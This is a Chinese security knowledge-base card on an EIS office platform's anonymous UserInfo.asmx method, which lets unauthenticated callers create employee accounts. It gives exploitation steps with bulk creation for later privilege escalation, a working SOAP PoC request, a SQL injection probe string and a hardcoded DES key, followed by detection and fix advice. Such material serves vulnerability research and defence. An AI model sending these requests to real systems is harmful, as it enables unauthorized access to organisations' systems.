---
id: web-generic-auth-eis-userinfo-asmx-unauth-user-create
title: EIS 办公平台 UserInfo.asmx 匿名 WebMethod：未授权创建员工账号并写入 DES 口令
type: scenario
domain: web
path: web/generic/auth
technique: dotnet-asmx-anonymous-usermethod-create-account
tags:
- auth-bypass
- unauthorized
- dotnet
- asmx
- webservice
- user-creation
- oa
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:17:43+08:00'
  notes: '已对照原文与图16/17/18核对：UserInfo : System.Web.Services.WebService，[WebMethod] public new bool User(string account,string name,string pwd,int depId,int posId)，先查 FI_ORG_EMP 是否存在，不存在则 DesEncrypt(pwd,"futureinfo") 后 INSERT，均与图16一致；图17 SOAP POST UserInfo.asmx 返回 <UserResult>true</UserResult>，图18 数据库查询确认 id=5 account=testuser name=测试用户 dept_id=1 position_id=1 已入库。原文未演示新账号登录，卡内 confidence=medium 与边界说明一致；web.config 匿名目录原文表格写 XX、正文写 WS，卡内以“WS/XX”表述可接受。PoC 未本机执行。原文未给产品版本，未设置 affected_versions；frontmatter 无 sources/source_url。'
url: /docs/web/generic/auth/web-generic-auth-eis-userinfo-asmx-unauth-user-create/
draft: false
kb_aliases:
- EIS 任意用户添加
- UserInfo.asmx User 方法
- 未授权新建员工
- ASMX 匿名用户创建
- FI_ORG_EMP 插入
- WebService 无鉴权
---

## 一句话结论

某 EIS 办公平台的 `UserInfo.asmx` 暴露 `[WebMethod] User(account, name, pwd, depId, posId)`，`WS` 目录在 `web.config` 中匿名放行且方法内部无任何权限校验；未登录攻击者可直接调用它，在员工主表 `FI_ORG_EMP` 中插入一个带 DES 加密口令的新账号，文章已验证记录成功写入。

## 原理

- 入口：`bin/yard.WebService/yard.WebService.WS/UserInfo.cs`，类 `UserInfo : System.Web.Services.WebService`，方法 `[WebMethod] public new bool User(string account, string name, string pwd, int depId, int posId)`。
- 逻辑：先 `SELECT id FROM FI_ORG_EMP WHERE [account]=N'{account}'` 判断是否存在；不存在则 `pwd = new Cryptography().DesEncrypt(pwd, "futureinfo")`，再 `INSERT FI_ORG_EMP([org_id],[dept_id],[position_id],[name],[code],[account],[pwd],[isactive]...)`。
- 缺陷：`web.config` 对 `WS`/`XX` WebService 目录配置 `<allow users="*" />`，ASMX 匿名可达；`User` 方法没有 `[PrincipalPermission]`、没有角色/会话判断，也没有邀请码/审批，直接执行数据库写操作。SQL 里 `account` 同样是字符串拼接（还存在二次注入面），但本卡聚焦未授权创建。
- 为什么成立：ASMX 的 `[WebMethod]` 一旦发布，任何能访问 `.asmx` 的客户端都可以按 SOAP 协议调用；授权若只靠前端页面或目录配置，就会在目录被匿名放行时整体失效。
- 影响：可在员工主表批量插入账号。口令使用系统同一 DES 算法与固定密钥 `futureinfo` 加密，格式与正常账号一致，因此新建账号具备正常登录的可能（文章未实际登录验证）；同时会污染组织架构、占用账号名，并为后续社工/权限提升提供落脚点。

## 触发条件

- 目标 EIS 办公平台暴露 `UserInfo.asmx`，且 `WS` 目录按默认配置匿名可访问。
- `User` WebMethod 可达，参数 `account/name/pwd/depId/posId` 可控。
- 数据库连接账号对 `FI_ORG_EMP` 有插入权限（应用正常运行即满足）。
- 新建账号能否登录取决于系统对 `isactive`、组织/岗位、密码策略的校验；文章只验证了入库成功。

## 利用步骤

1. 访问 `/UserInfo.asmx` 或读取 WSDL，确认 `User` 方法存在及参数顺序。
2. 构造 SOAP 请求，填入新账号 `account`、姓名 `name`、口令 `pwd`、部门 `depId`、岗位 `posId`。
3. 发送到 `/UserInfo.asmx`，`SOAPAction: "http://tempuri.org/User"`。
4. 响应 `<UserResult>true</UserResult>` 表示创建成功；可在数据库 `FI_ORG_EMP` 中看到新记录（文章截图确认）。
5. 用该账号尝试登录系统；若被禁用/组织校验拦截，可调整 `depId`/`posId` 或结合其他接口激活。
6. 批量调用可创建大量账号，用于账号池或后续权限提升。

## PoC

```http
POST /UserInfo.asmx HTTP/1.1
Host: target.example:8001
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/User"
Content-Length: 457

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <User xmlns="http://tempuri.org/">
      <account>testuser</account>
      <name>测试用户</name>
      <pwd>testpass123</pwd>
      <depId>1</depId>
      <posId>1</posId>
    </User>
  </soap:Body>
</soap:Envelope>
```

```text
# 预期：HTTP 200，返回
# <UserResult>true</UserResult>
# 数据库 FI_ORG_EMP 新增 account=testuser 的记录（文章截图）。
```

## 变体与关联

- 变体：`account` 被直接拼进 `SELECT`，可用 `account=test' OR '1'='1` 之类探测注入或绕过存在性判断。
- 变体：若方法支持更多字段（角色、`isactive`、组织 ID），可通过 mass assignment 创建高权限/激活状态账号。
- 关联：[[web-generic-auth-unauth-user-create-admin-takeover]]（未授权用户创建接口的通用模式）；[[web-generic-auth-swagger-unauth-user-management]]（未授权用户管理接口）；[[web-generic-auth-hardcoded-bip-cred-orgid-user-create]]（硬编码凭据创建用户）。
- 边界：文章只证明记录插入成功，未演示用新账号登录；若系统对新建账号默认禁用或要求审批，实际接管后台不成立，因此 confidence 定为 medium。

## 检测与防御

- 检测：审计 ASMX/WebService 中所有 `[WebMethod]` 的认证与授权注解；监控未登录状态下对 `UserInfo.asmx` 的 `User` 调用及 `FI_ORG_EMP` 的异常插入；关注短时间内批量创建账号的行为。
- 修复：`User` 方法要求管理员会话与角色校验；WebService 目录不要整体 `<allow users="*" />`；服务端固定 `org_id`/角色，禁止客户端指定敏感字段。
- 加固：口令哈希改用加盐慢哈希而非固定密钥 DES；新账号默认最小权限并走审批；对账号创建记录来源 IP、操作者与审计日志。
